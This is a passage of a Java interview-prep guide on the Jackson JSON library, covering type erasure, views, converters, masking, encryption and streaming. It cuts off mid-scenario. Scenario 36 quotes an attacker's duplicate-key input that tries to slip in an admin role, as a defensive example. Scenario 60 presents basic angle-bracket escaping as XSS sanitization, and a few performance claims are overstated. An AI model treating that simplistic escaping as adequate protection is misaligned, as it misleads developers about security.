**Question:** Why does `objectMapper.readValue(json, List.class)` return a `List<LinkedHashMap>` instead of `List<User>`, causing `ClassCastException`?
- **Answer:** Due to Java **Type Erasure**, generic type information (`List<User>`) is stripped at compile-time into `List<Object>`. Jackson has no way of knowing the target element type and defaults to `LinkedHashMap`.
  - *Fix*: Use a `TypeReference` anonymous class:
    ```java
    List<User> users = objectMapper.readValue(json, new TypeReference<List<User>>() {});
    ```

---

### Scenario 13: The `DEFAULT_VIEW_INCLUSION` Trap in `@JsonView`
**Question:** You annotated sensitive fields with `@JsonView(AdminView.class)`. Why are unannotated public fields also included in the public response?
- **Answer:** By default, Jackson enables `MapperFeature.DEFAULT_VIEW_INCLUSION = true`, meaning any field without a `@JsonView` annotation is included in *all* views.
  - *Fix*: Disable the feature:
    ```java
    objectMapper.disable(MapperFeature.DEFAULT_VIEW_INCLUSION);
    ```

---

### Scenario 14: Thread-Safe High-Throughput Reusability (`ObjectReader` / `ObjectWriter`)
**Question:** Why are `ObjectReader` and `ObjectWriter` faster than calling `objectMapper.readValue()` in high-concurrency microservices?
- **Answer:** While `ObjectMapper` is thread-safe, calling `readValue()` checks internal configurations and builds temporary root contexts. `ObjectReader` and `ObjectWriter` are completely immutable, pre-configured, and pre-warmed, delivering maximum throughput with zero lock contention.

---

### Scenario 15: Single Quotes and Unquoted Field Support
**Question:** How do you configure Jackson to parse malformed JSON containing unquoted keys or single-quoted values from legacy systems?
- **Answer:** Enable parser features on `JsonFactory`:
  ```java
  ObjectMapper mapper = JsonMapper.builder()
      .enable(JsonReadFeature.ALLOW_UNQUOTED_FIELD_NAMES)
      .enable(JsonReadFeature.ALLOW_SINGLE_QUOTES)
      .build();
  ```

---

### Scenario 16: Deep Merging JSON into Existing Objects (`readerForUpdating`)
**Question:** How do you implement a `PATCH` endpoint by merging incoming JSON directly onto an existing JPA entity?
- **Answer:** Use `objectMapper.readerForUpdating(existingEntity)`:
  ```java
  User existingUser = userRepository.findById(id);
  objectMapper.readerForUpdating(existingUser).readValue(patchJsonString);
  userRepository.save(existingUser);
  ```

---

### Scenario 17: Flattening Nested JSON with `@JsonUnwrapped`
**Question:** How do you flatten an internal `GeoLocation` object into top-level `latitude` and `longitude` fields in the generated JSON?
- **Answer:** Annotate the field with `@JsonUnwrapped`:
  ```java
  public class StoreLocation {
      private String storeName;
      @JsonUnwrapped
      private GeoLocation location;
  }
  ```

---

### Scenario 18: Accepting String Numbers as Numerical Types
**Question:** A third-party client sends numbers wrapped in quotes (`"amount": "149.50"`). How do you deserialize this directly into a `BigDecimal` or `Double` without custom parsers?
- **Answer:** Enable `CoercionConfig` or use `@JsonFormat`:
  ```java
  @JsonFormat(shape = JsonFormat.Shape.STRING)
  private BigDecimal amount;
  ```

---

### Scenario 19: Preventing Sensitive Fields from Leaking into Logs via Custom Serializer
**Question:** How do you ensure passwords and API keys are automatically masked when logging objects with `objectMapper.writeValueAsString(obj)`?
- **Answer:** Bind a custom masking serializer to sensitive fields:
  ```java
  public class MaskingSerializer extends StdSerializer<String> {
      public MaskingSerializer() { super(String.class); }
      @Override
      public void serialize(String val, JsonGenerator gen, SerializerProvider p) throws IOException {
          gen.writeString("****REDACTED****");
      }
  }
  ```

---

### Scenario 20: Deserializing Polymorphic JSON with Header Discriminator (`As.EXTERNAL_PROPERTY`)
**Question:** The polymorphic type discriminator is not in the JSON body, but in an external envelope or property. How do you configure Jackson?
- **Answer:** Use `JsonTypeInfo.As.EXTERNAL_PROPERTY`:
  ```java
  @JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.EXTERNAL_PROPERTY, property = "payloadType")
  ```

---

### Scenario 21: Handling Empty Strings as Null Objects
**Question:** An API client passes `""` (empty string) for an optional object field instead of `null`. How do you prevent deserialization failure?
- **Answer:** Enable `DeserializationFeature.ACCEPT_EMPTY_STRING_AS_NULL_OBJECT`:
  ```java
  objectMapper.enable(DeserializationFeature.ACCEPT_EMPTY_STRING_AS_NULL_OBJECT);
  ```

---

### Scenario 22: Preserving Float Precision with `USE_BIG_DECIMAL_FOR_FLOATS`
**Question:** When parsing JSON into a dynamic `Map<String, Object>`, floating point numbers like `0.1` lose precision. How do you force `BigDecimal`?
- **Answer:** Enable `DeserializationFeature.USE_BIG_DECIMAL_FOR_FLOATS`:
  ```java
  objectMapper.enable(DeserializationFeature.USE_BIG_DECIMAL_FOR_FLOATS);
  ```

---

### Scenario 23: Programmatic Property Introspection via `BeanDescription`
**Question:** How do you introspect all annotated properties of a class using Jackson's internal metadata engine?
- **Answer:** Use `objectMapper.getSerializationConfig().introspect(javaType)`:
  ```java
  JavaType type = mapper.constructType(MyClass.class);
  BeanDescription desc = mapper.getSerializationConfig().introspect(type);
  List<BeanPropertyDefinition> props = desc.findProperties();
  ```

---

### Scenario 24: Global Naming Strategies: CamelCase to Kebab-Case
**Question:** How do you configure Spring Boot so all JSON endpoints automatically output `kebab-case` keys (`user-id`)?
- **Answer:** In `application.yml`:
  ```yaml
  spring:
    jackson:
      property-naming-strategy: KEBAB_CASE
  ```

---

### Scenario 25: Deserializing Immutable Collections (`GuavaModule`)
**Question:** How do you deserialize JSON directly into Guava `ImmutableList` or `ImmutableMap`?
- **Answer:** Register the `GuavaModule`:
  ```java
  objectMapper.registerModule(new GuavaModule());
  ```

---

### Scenario 26: Injecting Dependencies into Deserialized POJOs (`@JacksonInject`)
**Question:** How do you inject a Spring service or database connection into a POJO during JSON deserialization?
- **Answer:** Use `@JacksonInject`:
  ```java
  public class OrderDto {
      @JacksonInject("currencyConverter")
      private CurrencyConverter converter;
  }
  ```
  Pass the injectable values during read:
  ```java
  InjectableValues inject = new InjectableValues.Std().addValue("currencyConverter", converterService);
  objectMapper.reader(inject).readValue(json, OrderDto.class);
  ```

---

### Scenario 27: Ordering JSON Fields Alphabetically
**Question:** How do you guarantee deterministic, alphabetical field ordering in JSON responses for cryptographic hashing?
- **Answer:** Enable `SerializationFeature.ORDER_MAP_ENTRIES_BY_KEYS` and configure class-level ordering:
  ```java
  @JsonPropertyOrder(alphabetic = true)
  public class CanonicalPayload { ... }
  ```

---

### Scenario 28: Pretty Printing JSON for Debugging without Performance Loss
**Question:** How do you pretty-print JSON only when running in development mode without reconfiguring the global singleton `ObjectMapper`?
- **Answer:** Use `writerWithDefaultPrettyPrinter()`:
  ```java
  String prettyJson = objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(data);
  ```

---

### Scenario 29: Reading Single Values as Arrays
**Question:** A legacy API sometimes returns a single string `"tag": "news"` and other times returns an array `"tag": ["news", "sports"]`. How do you deserialize both into `List<String>`?
- **Answer:** Enable `DeserializationFeature.ACCEPT_SINGLE_VALUE_AS_ARRAY`:
  ```java
  objectMapper.enable(DeserializationFeature.ACCEPT_SINGLE_VALUE_AS_ARRAY);
  ```

---

### Scenario 30: Custom Serializers with Context (`ContextualSerializer`)
**Question:** How do you write a custom serializer that accesses field-level annotations to know how many characters to mask?
- **Answer:** Implement `ContextualSerializer`:
  ```java
  public class DynamicMaskSerializer extends JsonSerializer<String> implements ContextualSerializer {
      private int keepChars;
      @Override
      public JsonSerializer<?> createContextual(SerializerProvider prov, BeanProperty property) {
          MaskAnnotation ann = property.getAnnotation(MaskAnnotation.class);
          int keep = (ann != null) ? ann.keep() : 4;
          return new DynamicMaskSerializer(keep);
      }
      ...
  }
  ```

---

### Scenario 31: Enforcing Non-Empty Collections during Validation
**Question:** How does `@JsonInclude(Include.NON_EMPTY)` differentiate between an empty `List` and a `null` list?
- **Answer:** `NON_NULL` excludes only `null` references; an empty list `[]` is still serialized. `NON_EMPTY` checks both: if the list is `null` OR `list.isEmpty()`, the entire field is omitted from the JSON output.

---

### Scenario 32: Bypassing Getters/Setters via Field Direct Access
**Question:** How do you force Jackson to read and write private fields directly via reflection, ignoring broken getter/setter logic?
- **Answer:** Configure `VisibilityChecker`:
  ```java
  objectMapper.setVisibility(PropertyAccessor.FIELD, JsonAutoDetect.Visibility.ANY);
  objectMapper.setVisibility(PropertyAccessor.GETTER, JsonAutoDetect.Visibility.NONE);
  ```

---

### Scenario 33: Streaming Huge JSON Arrays Directly to Servlet `OutputStream`
**Question:** How do you export 1,000,000 records from a database to an HTTP client as a JSON array without running out of memory?
- **Answer:** Stream tokens directly to the servlet output stream using `JsonGenerator`:
  ```java
  try (JsonGenerator gen = objectMapper.getFactory().createGenerator(response.getOutputStream())) {
      gen.writeStartArray();
      while (cursor.hasNext()) {
          objectMapper.writeValue(gen, cursor.next()); // Flushes individual items!
      }
      gen.writeEndArray();
  }
  ```

---

### Scenario 34: Deserializing Unknown Subtypes Gracefully
**Question:** What happens when an unknown polymorphic subtype is received in `@JsonTypeInfo`, and how do you designate a default fallback class?
- **Answer:** Set `defaultImpl` on `@JsonTypeInfo`:
  ```java
  @JsonTypeInfo(
      use = JsonTypeInfo.Id.NAME, 
      property = "type", 
      defaultImpl = DefaultUnknownEvent.class
  )
  ```

---

### Scenario 35: Case-Insensitive Field Deserialization
**Question:** How do you accept JSON keys regardless of whether the client sends `firstName`, `FirstName`, or `FIRSTNAME`?
- **Answer:** Enable `MapperFeature.ACCEPT_CASE_INSENSITIVE_PROPERTIES`:
  ```java
  objectMapper.enable(MapperFeature.ACCEPT_CASE_INSENSITIVE_PROPERTIES);
  ```

---

### Scenario 36: Preventing Duplicate JSON Keys
**Question:** An attacker submits JSON with duplicate keys (`{"role": "user", "role": "admin"}`). How do you force Jackson to reject this?
- **Answer:** Enable `StreamReadFeature.STRICT_DUPLICATE_DETECTION`:
  ```java
  JsonFactory factory = JsonFactory.builder()
      .enable(StreamReadFeature.STRICT_DUPLICATE_DETECTION)
      .build();
  ObjectMapper mapper = new ObjectMapper(factory);
  ```

---

### Scenario 37: Custom Type ID Resolvers (`@JsonTypeIdResolver`)
**Question:** When is `@JsonSubTypes` insufficient, and how do you dynamically look up polymorphic classes from a Spring ApplicationContext?
- **Answer:** Implement a custom `TypeIdResolver`:
  ```java
  @JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM, property = "type")
  @JsonTypeIdResolver(SpringBeanTypeIdResolver.class)
  public interface Command {}
  ```

---

### Scenario 38: Mapping Root JSON Wrapping (`@JsonRootName`)
**Question:** How do you wrap output JSON inside a root key (`{"user": {"name": "Bob"}}`) without creating a wrapper DTO?
- **Answer:** Annotate the class with `@JsonRootName("user")` and enable `SerializationFeature.WRAP_ROOT_VALUE`:
  ```java
  objectMapper.enable(SerializationFeature.WRAP_ROOT_VALUE);
  ```

---

### Scenario 39: Ignoring Fields Conditionally Based on Values
**Question:** How do you exclude an integer field only when its value is `-1`?
- **Answer:** Use `@JsonInclude(value = JsonInclude.Include.CUSTOM, valueFilter = NegativeOneFilter.class)`:
  ```java
  public class NegativeOneFilter {
      @Override public boolean equals(Object obj) {
          return obj instanceof Integer i && i == -1;
      }
  }
  ```

---

### Scenario 40: Jackson with Protocol Buffers / Avro
**Question:** Can Jackson parse Protobuf binary payloads?
- **Answer:** Yes! Jackson supports pluggable data formats via extension modules: `jackson-dataformat-protobuf`, `jackson-dataformat-avro`, `jackson-dataformat-yaml`, and `jackson-dataformat-xml`.

---

### Scenario 41: Resolving Dates with Nano Precision
**Question:** How do you prevent Jackson from truncating nanoseconds when serializing `Instant`?
- **Answer:** Ensure `SerializationFeature.WRITE_DATE_TIMESTAMPS_AS_NANOSECONDS` is enabled (default is `true` when `JavaTimeModule` is registered).

---

### Scenario 42: Converting Between POJOs via `convertValue`
**Question:** What is the difference between `readValue(writeValueAsString(obj))` and `convertValue(obj, Target.class)`?
- **Answer:** `convertValue()` does NOT serialize to intermediate JSON strings! It walks the in-memory token stream directly between the source and target objects, running **10x faster** with zero string allocations.

---

### Scenario 43: Preventing Null Primitive Injection
**Question:** If incoming JSON sends `"count": null` for a Java `int count` field, what happens, and how do you fail fast?
- **Answer:** By default, Jackson sets Java primitive `int` to `0`. To fail fast:
  ```java
  objectMapper.enable(DeserializationFeature.FAIL_ON_NULL_FOR_PRIMITIVES);
  ```

---

### Scenario 44: Deserializing Map with Complex Non-String Keys
**Question:** How do you deserialize JSON into a `Map<Point, String>` where the key is a complex object?
- **Answer:** Implement a custom `KeyDeserializer`:
  ```java
  public class PointKeyDeserializer extends KeyDeserializer {
      @Override
      public Object deserializeKey(String key, DeserializationContext ctxt) {
          // Parse "10,20" string into Point(10, 20)
          return Point.parse(key);
      }
  }
  ```

---

### Scenario 45: Preventing Serialization of Empty Beans (`FAIL_ON_EMPTY_BEANS`)
**Question:** Why does Jackson throw an error when serializing an object with no public getters, and how do you handle it?
- **Answer:** Throws `InvalidDefinitionException: No serializer found for class`. You can disable it via:
  ```java
  objectMapper.disable(SerializationFeature.FAIL_ON_EMPTY_BEANS);
  ```
  Or ensure proper field accessors exist.

---

### Scenario 46: Customizing Naming for Specific Builder Classes
**Question:** How do you configure Jackson to deserialize into a Lombok `@Builder` class?
- **Answer:** Use `@JsonDeserialize(builder = MyClass.MyClassBuilder.class)`:
  ```java
  @JsonDeserialize(builder = Order.OrderBuilder.class)
  public class Order {
      @JsonPOJOBuilder(withPrefix = "")
      public static class OrderBuilder {}
  }
  ```

---

### Scenario 47: Tree Model Navigation: `get()` vs `path()`
**Question:** What is the critical difference between `rootNode.get("field")` and `rootNode.path("field")`?
- **Answer:** `get()` returns `null` if the field does not exist; chaining `.get("a").get("b")` throws `NullPointerException`. `path()` returns a `MissingNode` singleton; chaining `.path("a").path("b").asText("default")` **never throws NPE**, making it safe for deep navigation.

---

### Scenario 48: Handling Java 9+ Modules (JPMS) Reflection Restrictions
**Question:** Why does Jackson fail with `InaccessibleObjectException` on Java 17 when introspecting unexported packages?
- **Answer:** Java strong encapsulation forbids reflective access to private fields in unexported modules. The target package must be opened to Jackson in `module-info.java`:
  ```java
  opens com.example.dto to com.fasterxml.jackson.databind;
  ```

---

### Scenario 49: Serialization Invariants: `@JsonAppend`
**Question:** How do you dynamically append an extra calculated field (e.g., server processing time) to every serialized JSON object without modifying the DTO class?
- **Answer:** Use `@JsonAppend` with a custom `VirtualBeanPropertyWriter`.

---

### Scenario 50: Jackson 3.x (`tools.jackson`) Next-Generation Architecture
**Question:** What architectural changes are introduced in Jackson 3.0?
- **Answer:** Jackson 3.0 migrates to package `tools.jackson`, enforces complete immutability on `ObjectMapper` via strict Builder patterns (`JsonMapper.builder()`), and removes all deprecated legacy APIs.

---

### Scenario 51: Jackson `Converter<IN, OUT>` vs `JsonSerializer<T>` & `JsonDeserializer<T>`: When to Choose Which?
**Question:** Explain the architectural trade-offs between implementing a `JsonSerializer<T>` vs a `Converter<IN, OUT>`, and under what circumstances should an enterprise prefer one over the other?
- **Interviewer Evaluation:** Assesses understanding of low-level streaming token generation (`JsonGenerator`) vs high-level intermediate object transformation, cognitive complexity vs garbage collection pressure, and type safety.
- **Standout Technical Answer:**
  - **`JsonSerializer<T>` / `JsonDeserializer<T>` (Low-Level Streaming)**:
    - Directly emits or consumes raw JSON tokens via `JsonGenerator` / `JsonParser` (`writeStartObject()`, `writeStringField()`, `nextToken()`).
    - **Pros**: Zero intermediate heap allocations; maximum possible performance and minimum GC overhead.
    - **Cons**: Verbose, procedural, error-prone code. Requires manual state machine handling and manual field escaping.
  - **`Converter<IN, OUT>` (High-Level Intermediate Mapping)**:
    - Instead of dealing with low-level JSON tokens, the converter transforms the source object into an **intermediate Java object** (`OUT`) that Jackson already knows how to serialize (e.g. `String`, `Map<String, Object>`, or an intermediate DTO).
    - **Pros**: Extremely clean, declarative, type-safe, and reusable. Developers write pure Java transformations without knowing Jackson streaming token internals.
    - **Cons**: Allocates an intermediate Java object in heap memory for every conversion, which can introduce minor GC allocation churn under extreme high-throughput ($> 50,000\text{ QPS}$) workloads.
- **Follow-Up Trap & Winning Answer:**
  - *Trap:* "Can a `Converter<IN, OUT>` be used to deserialize JSON as well, or is it strictly for serialization?"
  - *Winning Answer:* "A `Converter<IN, OUT>` works symmetrically! When used with `@JsonSerialize(converter = ...)`, it transforms `DomainObject -> IntermediateType`. When used with `@JsonDeserialize(converter = ...)`, it transforms `IntermediateType -> DomainObject`. You can pair both converters on the same field to achieve full bidirectional conversion!"

---

### Scenario 52: The `StdConverter<IN, OUT>` Base Class & Type Resolution via `TypeFactory`
**Question:** Why does Jackson provide `StdConverter<IN, OUT>`, and what problem does it solve compared to implementing the raw `Converter<IN, OUT>` interface directly?
- **Interviewer Evaluation:** Evaluates knowledge of Java type erasure, Jackson's `JavaType` resolution, and how `TypeFactory` discovers input and output types at runtime.
- **Standout Technical Answer:**
  - The raw Jackson interface `Converter<IN, OUT>` requires implementing three methods:
    1. `OUT convert(IN value)`
    2. `JavaType getInputType(TypeFactory typeFactory)`
    3. `JavaType getOutputType(TypeFactory typeFactory)`
  - Implementing `getInputType` and `getOutputType` manually requires constructing complex `JavaType` instances via `TypeFactory.defaultInstance().constructType(...)`.
  - **`StdConverter<IN, OUT>`**:
    - An abstract convenience class that automatically introspects the generic type parameters `<IN, OUT>` via reflection at startup.
    - It pre-populates `getInputType()` and `getOutputType()` automatically using `TypeBindings`.
    - Developers only need to override a single method: `public abstract OUT convert(IN value)`.
- **Production Code Blueprint**:
  ```java
  public class EpochMillisToInstantConverter extends StdConverter<Long, Instant> {
      @Override
      public Instant convert(Long epochMillis) {
          return (epochMillis != null) ? Instant.ofEpochMilli(epochMillis) : null;
      }
  }
  ```

---

### Scenario 53: Two-Way Bidirectional Converters: Symmetric Encryption / Decryption at the DTO Boundary
**Question:** How do you implement field-level AES-GCM encryption and decryption at the Jackson serialization boundary using paired `StdConverter` classes without writing low-level serializers?
- **Interviewer Evaluation:** Assesses practical security engineering, DTO-level transparent encryption, and pairing serialization and deserialization converters.
- **Standout Technical Answer:**
  - Create two paired `StdConverter` classes:
    1. `EncryptingConverter extends StdConverter<String, String>`: Takes plaintext string, encrypts it via AES-256-GCM, and returns Base64 ciphertext.
    2. `DecryptingConverter extends StdConverter<String, String>`: Takes Base64 ciphertext, decrypts it, and returns the plaintext string.
  - Annotate the DTO field with both annotations:
    ```java
    public record UserProfileDto(
        String userId,
        @JsonSerialize(converter = EncryptingConverter.class)
        @JsonDeserialize(converter = DecryptingConverter.class)
        String ssn
    ) {}
    ```
  - When returning `UserProfileDto` via a REST endpoint, Jackson automatically invokes `EncryptingConverter`, returning ciphertext to the client. When receiving a payload, `DecryptingConverter` transparently decrypts the ciphertext into plaintext before your controller receives it!

---

### Scenario 54: `contentConverter`: Transforming Elements within Lists, Sets, and Maps
**Question:** How do you apply a converter to individual elements inside a `List<Money>` or values inside a `Map<String, String>` without writing a custom collection serializer?
- **Interviewer Evaluation:** Evaluates knowledge of `@JsonSerialize(contentConverter = ...)` and `@JsonDeserialize(contentConverter = ...)` for nested container elements.
- **Standout Technical Answer:**
  - Standard `converter = ...` converts the **entire collection container object** (`List` $\to$ `String`).
  - **`contentConverter = ...`**: Converts **each individual element inside the collection** while preserving the outer collection structure!
- **Production Code Blueprint**:
  ```java
  // Sanitizing / Trimming every string inside a list:
  public class StringTrimConverter extends StdConverter<String, String> {
      @Override
      public String convert(String value) {
          return (value != null) ? value.trim() : null;
      }
  }

  public record BulkArticleRequest(
      String category,
      // Transforms every item in the List individually:
      @JsonDeserialize(contentConverter = StringTrimConverter.class)
      List<String> keywords
  ) {}
  // Input JSON: {"category": "Tech", "keywords": ["  java  ", "  spring  "]}
  // Deserialized Record: ["java", "spring"]
  ```

---

### Scenario 55: Jackson `Converter` vs Spring Framework `Converter<S, T>`: Architectural Boundaries
**Question:** Differentiate the execution lifecycle, scope, and use cases of Jackson's `com.fasterxml.jackson.databind.util.Converter` vs Spring Framework's `org.springframework.core.convert.converter.Converter`.
- **Interviewer Evaluation:** Assesses architectural clarity in the Spring Web pipeline, understanding the difference between HTTP message body binding (`HttpMessageConverter`) and URI/Form parameter binding (`WebDataBinder`).
- **Standout Technical Answer:**
  - **Spring Framework `Converter<S, T>`**:
    - Registered with Spring's `ConversionService` (`WebDataBinder`).
    - Operates on **HTTP Query Parameters, Path Variables, Request Headers, and Form Data** (e.g. converting `@PathVariable("date") LocalDate date` or `@RequestParam("status") StatusEnum status`).
    - Has **ZERO involvement** in JSON request bodies (`@RequestBody`)!
  - **Jackson `Converter<IN, OUT>`**:
    - Executes **inside the `MappingJackson2HttpMessageConverter` engine** during JSON serialization and deserialization of the HTTP request/response body.
    - Used on fields of DTOs annotated with `@RequestBody` or returned from `@ResponseBody`.
- **Follow-Up Trap:** *"If you register a Spring `@Component public class MyConverter implements Converter<String, Money>`, will Jackson automatically use it to deserialize JSON properties?"*
  - *Winning Answer:* "No! Jackson has its own independent converter SPI (`com.fasterxml.jackson.databind.util.Converter`). Spring's `ConversionService` is not invoked by Jackson during JSON property deserialization unless custom bridge adapters are explicitly configured."

---

### Scenario 56: Jackson `Converter` vs JPA `@Converter` (`AttributeConverter<X, Y>`)
**Question:** Compare Jackson Converters and JPA `AttributeConverter`. In an enterprise application, where does each sit in the data flow?
- **Interviewer Evaluation:** Evaluates clean architecture, boundary separation, transport serialization vs database persistence mapping.
- **Standout Technical Answer:**
  - **Jackson Converter**: Sits at the **Transport Boundary (API Gateway / REST Layer)**. Translates between JSON representations over the network and Java DTOs.
  - **JPA `AttributeConverter`**: Sits at the **Persistence Boundary (Database Layer)**. Translates between Java Entity attributes and database column types (e.g. converting a Java `List<String>` or complex object into a PostgreSQL `JSONB` or `VARCHAR` column).
- **The End-to-End Data Flow**:
  ```
  [ Client JSON ]
         |
         v (Jackson Converter converts JSON String -> DTO Money)
  [ Controller DTO: Money ]
         |
         v (Domain Service maps DTO -> JPA Entity)
  [ JPA Entity: Money ]
         |
         v (JPA AttributeConverter converts Money -> DB Column VARCHAR)
  [ PostgreSQL Database ]
  ```

---

### Scenario 57: Null Handling in Jackson Converters: The `convert(null)` Trap
**Question:** Does Jackson call `converter.convert(null)` when an incoming JSON field is null, or does it bypass the converter? What happens if your converter assumes non-null input?
- **Interviewer Evaluation:** Assesses defensive coding, edge-case handling in deserializers, and preventing production `NullPointerException` cascades.
- **Standout Technical Answer:**
  - By default, Jackson **CAN pass `null` to `Converter.convert(value)`** during deserialization if an explicit JSON `null` token (`"field": null`) is encountered!
  - **The Fatal Trap**: If a developer writes:
    ```java
    public class StringUpperConverter extends StdConverter<String, String> {
        @Override
        public String convert(String value) {
            return value.toUpperCase(); // CRASHES with NullPointerException on null JSON!
        }
    }
    ```
  - **Production Rule**: Every Jackson `Converter` must be **strictly null-safe**:
    ```java
    @Override
    public String convert(String value) {
        if (value == null) return null;
        return value.toUpperCase();
    }
    ```

---

### Scenario 58: Dependency Injection in Jackson Converters: Injecting Spring Beans via `SpringHandlerInstantiator`
**Question:** Jackson instantiates converters using their default no-arg constructor by default. How do you inject Spring `@Service` beans (e.g. `EncryptionService`, `CurrencyRateService`) into a Jackson `StdConverter`?
- **Interviewer Evaluation:** Evaluates Spring Boot integration, Jackson SPI `HandlerInstantiator`, and autowiring custom serializers and converters.
- **Standout Technical Answer:**
  - By default, Jackson uses reflection: `converterClass.getDeclaredConstructor().newInstance()`.
  - To allow Jackson to pull converter instances from the Spring `ApplicationContext`:
    1. Annotate the Converter with Spring's `@Component`.
    2. Register Spring's **`SpringHandlerInstantiator`** with the `ObjectMapper`:
  ```java
  @Configuration
  public class JacksonSpringConfig {
      public JacksonSpringConfig(ObjectMapper objectMapper, ApplicationContext context) {
          objectMapper.setHandlerInstantiator(
              new SpringHandlerInstantiator(context.getAutowireCapableBeanFactory())
          );
      }
  }

  @Component
  public class DatabaseLookupConverter extends StdConverter<String, CustomerEntity> {
      private final CustomerRepository repository;

      public DatabaseLookupConverter(CustomerRepository repository) {
          this.repository = repository;
      }

      @Override
      public CustomerEntity convert(String customerId) {
          return repository.findById(customerId).orElse(null);
      }
  }
  ```

---

### Scenario 59: Currency & Monetary Conversions: Mapping API Cents Integer to Domain `Money`
**Question:** Front-end APIs pass monetary values as integer cents (`"price_cents": 1999`) to prevent floating-point precision loss. How do you use a Jackson Converter to map this cleanly to a domain `Money(BigDecimal amount, Currency currency)` object?
- **Interviewer Evaluation:** Practical enterprise domain modeling, preventing IEEE 754 precision bugs, and clean separation of concerns.
- **Standout Technical Answer:**
  ```java
  public class CentsToMoneyConverter extends StdConverter<Long, Money> {
      @Override
      public Money convert(Long cents) {
          if (cents == null) return null;
          BigDecimal amount = BigDecimal.valueOf(cents).divide(BigDecimal.valueOf(100), 2, RoundingMode.HALF_UP);
          return new Money(amount, Currency.getInstance("USD"));
      }
  }

  public class MoneyToCentsConverter extends StdConverter<Money, Long> {
      @Override
      public Long convert(Money money) {
          if (money == null) return null;
          return money.amount().multiply(BigDecimal.valueOf(100)).longValueExact();
      }
  }

  public record CheckoutItem(
      String sku,
      @JsonSerialize(converter = MoneyToCentsConverter.class)
      @JsonDeserialize(converter = CentsToMoneyConverter.class)
      Money unitPrice
  ) {}
  // Incoming JSON: {"sku": "A1", "unitPrice": 1999}
  // Deserialized Record: Money(amount=19.99, currency=USD)
  ```

---

### Scenario 60: Global String Trimming & XSS Sanitization via `StdConverter<String, String>`
**Question:** How do you enforce that all incoming JSON strings are automatically trimmed of leading/trailing whitespace and stripped of dangerous HTML tags across the entire application?
- **Interviewer Evaluation:** Evaluates global sanitization pipelines, input hygiene, and Jackson module binding.
- **Standout Technical Answer:**
  - Create a reusable `StringSanitizingConverter`:
    ```java
    public class StringSanitizingConverter extends StdConverter<String, String> {
        @Override
        public String convert(String value) {
            if (value == null) return null;
            // Trim whitespace and strip basic XSS characters
            return value.strip().replace("<", "&lt;").replace(">", "&gt;");
        }
    }
    ```
  - Register it globally on `String.class` using a `SimpleModule` or apply via `@JsonDeserialize(converter = StringSanitizingConverter.class)`.

---

### Scenario 61: Performance & Heap Allocation Analysis: Intermediate Object Pressure at 50,000 QPS
**Question:** Under a 50,000 requests-per-second load test, an application utilizing `@JsonSerialize(converter = ...)` experiences severe Young Generation GC pauses. Why does this happen and how do you profile it?
- **Interviewer Evaluation:** Assesses JVM memory profiling, allocation profiling via async-profiler, understanding the cost of intermediate objects in `Converter<IN, OUT>` vs zero-allocation `JsonSerializer`.
- **Standout Technical Answer:**
  - **The Root Cause**:
    - A `Converter<IN, OUT>` allocates a new intermediate object (`OUT`) in Eden space for every single property serialized.
    - At 50,000 QPS on a payload with 10 converted fields:
      $$50,000 \times 10 = 500,000 \text{ intermediate objects allocated per second!}$$
    - Eden space fills rapidly, triggering frequent Minor GC pauses (Stop-The-World duration 5–15ms), degrading tail latency ($P99$).
  - **The Solution for Ultra-High Throughput**:
    - Replace `Converter<IN, OUT>` with a direct, custom **`JsonSerializer<T>`**.
    - The `JsonSerializer` writes bytes directly into the pre-allocated Jackson internal buffer (`JsonGenerator.writeString(...)`) with **zero intermediate heap object allocations**.

---

### Scenario 62: Non-Standard Legacy Date String Normalization via `StdConverter<String, Instant>`
**Question:** An upstream legacy partner sends timestamps in a non-standard format (`"11-SEP-2024 14:30:00.000"`). How do you deserialize this cleanly into `java.time.Instant` on a specific field without altering the global `ObjectMapper` date format?
- **Interviewer Evaluation:** Evaluates handling heterogeneous API formats, thread-safe date parsing using `DateTimeFormatter`, and targeted converter binding.
- **Standout Technical Answer:**
  ```java
  public class LegacyDateToInstantConverter extends StdConverter<String, Instant> {
      private static final DateTimeFormatter FORMATTER = DateTimeFormatter
          .ofPattern("dd-MMM-yyyy HH:mm:ss.SSS")
          .withZone(ZoneId.of("UTC"));

      @Override
      public Instant convert(String dateString) {
          if (dateString == null || dateString.isBlank()) return null;
          return ZonedDateTime.parse(dateString, FORMATTER).toInstant();
      }
  }

  public record LegacyTransaction(
      String txId,
      @JsonDeserialize(converter = LegacyDateToInstantConverter.class)
      Instant timestamp
  ) {}
  ```

---

### Scenario 63: Transforming Complex Value Objects to Compact Delimited Strings (`GeoPoint` $\leftrightarrow$ `"lat,lon"`)
**Question:** A mobile client requires geospatial coordinates to be transmitted as a single compact comma-separated string (`"coordinates": "37.7749,-122.4194"`), but your Java domain model requires `record GeoPoint(double latitude, double longitude)`. How do you solve this with paired converters?
- **Interviewer Evaluation:** Evaluates flattening/unflattening data contracts, payload minimization for mobile networks, and parsing validation.
- **Standout Technical Answer:**
  ```java
  public class GeoPointToStringConverter extends StdConverter<GeoPoint, String> {
      @Override
      public String convert(GeoPoint point) {
          if (point == null) return null;
          return point.latitude() + "," + point.longitude();
      }
  }

  public class StringToGeoPointConverter extends StdConverter<String, GeoPoint> {
      @Override
      public GeoPoint convert(String value) {
          if (value == null || value.isBlank()) return null;
          String[] parts = value.split(",");
          if (parts.length != 2) throw new IllegalArgumentException("Invalid coordinate format: " + value);
          return new GeoPoint(Double.parseDouble(parts[0].trim()), Double.parseDouble(parts[1].trim()));
      }
  }

  public record StoreBranch(
      String storeName,
      @JsonSerialize(converter = GeoPointToStringConverter.class)
      @JsonDeserialize(converter = StringToGeoPointConverter.class)
      GeoPoint coordinates
  ) {}
  ```

---

### Scenario 64: Role-Based Field Masking Using Converters and Thread-Local Security Context
**Question:** How do you implement a `StdConverter<String, String>` that masks credit card numbers for regular users but reveals plaintext for users with `ROLE_ADMIN`, using Spring Security context?
- **Interviewer Evaluation:** Dynamic serialization, runtime contextual evaluation, and integrating security principals into the serialization pipeline.
- **Standout Technical Answer:**
  ```java
  public class RoleAwareCreditCardMaskConverter extends StdConverter<String, String> {
      @Override
      public String convert(String cardNumber) {
          if (cardNumber == null) return null;

          Authentication auth = SecurityContextHolder.getContext().getAuthentication();
          boolean isAdmin = auth != null && auth.getAuthorities().stream()
              .anyMatch(a -> "ROLE_ADMIN".equals(a.getAuthority()));

          if (isAdmin) {
              return cardNumber; // Reveal full number to authorized admin
          }
          // Mask for all other callers:
